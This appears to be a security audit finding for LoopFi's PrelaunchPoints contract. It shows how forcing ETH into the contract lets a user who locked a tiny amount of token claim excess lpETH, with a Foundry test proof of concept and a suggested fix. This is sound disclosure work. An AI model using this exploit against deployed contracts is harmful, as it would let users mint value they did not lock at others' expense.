# LoopFi - 05.2024 - yovchev_yoan's finiding

### [H-1] `PrelaunchPoints::lock, lockFor` allows a users to lock s small amount of LRT token and then force ether into the contract claiming as much lpETH as they want, removing the risk of locking a lot of tokens and braking the 2nd invariant

**Description:**

In the `Prelaunchpoint` the functions `lock` and `lockFor` allow users to lock LRTs or WETH into the contract. After the owners calls `setLoopAddresses` and converts all the ETH, users are able to call the `claim` and `claimAndStake` functions. A user can force ETH into the smart contract and right after call the `claim` function with the LRT Token with a small percentage. Because `claimedAmount` is set to `address(this).balance` this will also get the forced ETH, allowing users to remove the risk of locking a large amount and rather lock a small amount and then force ether to get the desired lpETH.

**Impact:**

1. Allows users to remove the risk of locking a large amount of tokens.
2. Allows users to mint how much ever lpETH they want, as long as they have the capital and a small locked amount of LRT Token.
3. This breaks the 2nd invariant - `Deposits are active up to the lpETH contract and lpETHVault contract are set`

**Proof of Concept:**

1. The user locks a desired amount of an LRT Token
2. Owner set the loop addresses and the 7 days to withdraw pass
3. Owner converts all the ETH, which allows user to claim, claim and stake
4. The user forces ETH into the contract
5. The user calls the `claim` function and gets the lpETH for the forced ETH

Paste this into `PrelaunchPoints.t.sol`

```javascript
function testDepositAndStakeAfterTheClaimStartDate() public {
        uint256 lockAmount = 10;
        address userOne = vm.addr(1);

        lrt.mint(userOne, lockAmount);

        vm.startPrank(userOne);
        lrt.approve(address(prelaunchPoints), lockAmount);
        prelaunchPoints.lock(address(lrt), lockAmount, referral);
        vm.stopPrank();

        // Set Loop Contracts and Convert to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();

        vm.warp(prelaunchPoints.startClaimDate() + 1);

        bytes memory data = abi.encodeWithSelector(0x415565b0, address(lrt), ETH, ((lockAmount * 1) / 100));

        vm.deal(userOne, 10);
        vm.prank(userOne);
        (bool success,) = address(prelaunchPoints).call{value: 10}("");
        if (!success) revert("Not Successful");

        uint256 temp = lpETH.balanceOf(address(userOne));
        console.log(temp);

        vm.prank(userOne);
        prelaunchPoints.claim(address(lrt), 1, PrelaunchPoints.Exchange.TransformERC20, data);

        temp = lpETH.balanceOf(address(userOne));
        console.log(temp);
    }
```

**Tools Used**

Manual Review

**Recommended Mitigation:**

1. If the `receive` function is called revert
